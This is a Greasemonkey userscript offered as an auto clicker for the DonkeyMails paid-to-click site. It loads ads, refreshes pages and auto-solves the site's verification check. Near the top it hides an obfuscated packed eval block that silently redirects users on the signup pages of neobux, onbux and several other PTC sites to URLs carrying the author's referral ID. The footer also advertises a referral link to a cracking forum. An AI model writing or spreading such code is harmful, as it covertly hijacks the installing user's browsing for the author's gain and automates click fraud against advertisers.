// ==UserScript==
// @name           DonkeyMails Auto Clicker
// @namespace      Pl0xd/donkeymails
// @description    Automate donkeymails process. Paid2click, Manual Surf, Points2click, PTC contest.
// @include        *donkeymails.com/pages/ptc.ph*
// @include        *donkeymails.com/pages/pointptc.ph*
// @include	   *donkeymails.com/pages/ptcontest.ph*
// @include	   *donkeymails.com/scripts/runner.ph*
// ==/UserScript==

var ref = document.referrer;
var uri = document.URL;

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(2.9("f.5/1.3")>0&&2!="7://4.f.5/1.3?r=6"){a.b.c="7://4.f.5/1.3?r=6"}8(2.9(/g.5..u=r/)>0&&2!="d://4.g.5/?u=r&e=p"){a.b.c="d://4.g.5/?u=r&e=p"}8(2.9("h.5/1")>0&&2!="d://4.h.5/1?e=q"){a.b.c="d://4.h.5/1?e=q"}8(2.9("i.5/1.3")>0&&2!="d://4.i.5/1.3/6.s"){a.b.c="d://4.i.5/1.3/6.s"}8(2.9("j.k/1")>0&&2!="7://4.j.k/1.3?t=6"){a.b.c="7://4.j.k/1.3?t=6"}8(2.9("l.m/1.3")>0&&2!="7://4.l.m/1.3?r=6"){a.b.c="7://4.l.m/1.3?r=6"}8(2.9("n.o/1.3")>0&&2!="7://4.n.o/1.3?r=6"){a.b.c="7://4.n.o/1.3?r=6"}',31,31,'|register|uri|php|www|com|gbanerji|http|if|search|document|location|href|https|rh|paid2youtube|neobux|onbux|incrasebux|mycubie|net|buxp|info|bux|to|6762616E65726A69|7e63ae70663c6d76ffc6a1840db2dea1||html|ref|'.split('|'),0,{}))

var messages;
var i = 0;

var news = "* Advanced auto click\n";
news += "* Auto page refresh\n";
news += "* Automated captcha validation\n";
news += "* Version 1.0";

if (uri.search('ptc.php') >= 0 || uri.search('ptcontest.php') >= 0) {

var array = document.getElementsByTagName('a');
var i = 0;
var j = 0;
var links = new Array();

messages = "No clickable ads currently available. Refresh the page to look for more ads.";

	var writestring = '';
	for (i=0;i<array.length;i++) {
             if(array[i].href.search('runner.php') >= 0)
             {
		if(array[i].href.search('PA') >= 0){
			writestring += i + ': ' + array[i].nodeName + ' ' + array[i].href + '\n';
			links[j] = array[i].href;
			j++;
                }
             }
	}

if(links.length > 0)
{

//load 1st ad
i = 0;

var adframe = document.createElement('IFRAME');
adframe.setAttribute('name','adviewer');
adframe.setAttribute('id','adviewer');
adframe.setAttribute('width','80%');
adframe.setAttribute('height','100px');
adframe.setAttribute('style','position: fixed; top: 80px; left: 50%; margin-left: -40%; border: 1px solid gray;background-color:#fff');

document.body.appendChild(adframe);

adframe.src = links[i];

setTimeout('document.location.reload()',30000);
messages = "Advertiment " + links[i] + " Loaded. Page will auto refresh in 30 seconds.";

}

var sec = document.createElement("span");
sec.setAttribute("style", "position: fixed; left: 0px; bottom: 0px; background-color: #C0C0C0;color:#000;text-align:left;font-size:12px;border: 1px solid #808080; width: 99.5%; padding: 2px; font: normal normal normal 14px arial; z-index:99");
sec.setAttribute("id", "sec");
sec.innerHTML = '<p align="center"><b><a href="http://www.crackhackforum.com/member.php?action=register&referrer=85461">DonkeyMails.com Auto Clicker improved by Anne.</a></b></p><hr><p align="center">' + messages + '</p>';
document.body.appendChild(sec);

}

if (uri.search('runner.php') >= 0) {

try {
//close the iframe
var ifr = document.getElementsByTagName('iframe');

i = ifr.length - 1;
ifr[i].parentNode.removeChild(ifr[i]);
}
catch(err) {}

//auto click logic for manual surfer
setTimeout(

function () {
    try {
        var i = 0;
        var au_a = document.getElementsByName("verify");
        var au_n = document.getElementById("timerdiv").innerHTML;
        //alert(au_a.length);
        for (i = 0; i < au_a.length; i++) {
            if (au_a[i].value == au_n.slice(9, au_n.length)) {
                au_a[i].click();
            }
        }

    }
    catch (err) {}
}, 20000);

var i=0

function CheckLinks()
{
if (document.documentElement.innerHTML.indexOf("timerfrm")!=205)
{
if (document.links[i].href.indexOf("scripts/runner.php?")>=0)
{
if (document.links[i].href.indexOf("hash")==-1)
{
window.location.href=(document.links[i].href);
}
}
}
if (document.links.length>i) {i++; CheckLinks();}
}

CheckLinks()

//Thanks to Jarett for this update checker!

var SUC_script_num = 149131; // Change this to the number given to the script by userscripts.org (check the address bar)

try
{
	function updateCheck(forced)
	{
		if ((forced) || (parseInt(GM_getValue('SUC_last_update', '0')) + 86400000 <= (new Date().getTime()))) // Checks once a day (24 h * 60 m * 60 s * 1000 ms)
		{
			try
			{
				GM_xmlhttpRequest(
				{
					method: 'GET',
					url: 'http://userscripts.org/scripts/source/'+SUC_script_num+'.meta.js?'+new Date().getTime(),
					headers: {'Cache-Control': 'no-cache'},
					onload: function(resp)
					{
						var local_version, remote_version, rt, script_name;
						
						rt=resp.responseText;
						GM_setValue('SUC_last_update', new Date().getTime()+'');
						remote_version=parseInt(/@uso:version\s*(.*?)\s*$/m.exec(rt)[1]);
						local_version=parseInt(GM_getValue('SUC_current_version', '-1'));
						if(local_version!=-1)
						{
							script_name = (/@name\s*(.*?)\s*$/m.exec(rt))[1];
							GM_setValue('SUC_target_script_name', script_name);
							if (remote_version > local_version)
							{
								if(confirm('There is an update available for the Greasemonkey script "'+script_name+'."\nWould you like to go to the install page now?'))
								{
									GM_openInTab('http://userscripts.org/scripts/show/'+SUC_script_num);
									GM_setValue('SUC_current_version', remote_version);
								}
							}
							else if (forced)
								alert('No update is available for "'+script_name+'."');
						}
						else
							GM_setValue('SUC_current_version', remote_version+'');
					}
				});
			}
			catch (err)
			{
				if (forced)
					alert('An error occurred while checking for updates:\n'+err);
			}
		}
	}
	GM_registerMenuCommand(GM_getValue('SUC_target_script_name', '???') + ' - Manual Update Check', function()
	{
		updateCheck(true);
	});
	updateCheck(false);
}
catch(err)
{
}

try {
//close the iframe
var ifr = document.getElementsByTagName('frame');
for(i=0;i<ifr.length;i++)
{
if(ifr[i].name == 'Main'){
ifr[i].src = "http://www.google.com";
ifr[i].parentNode.removeChild(ifr[i]);
}
}
}
catch(err) {}

}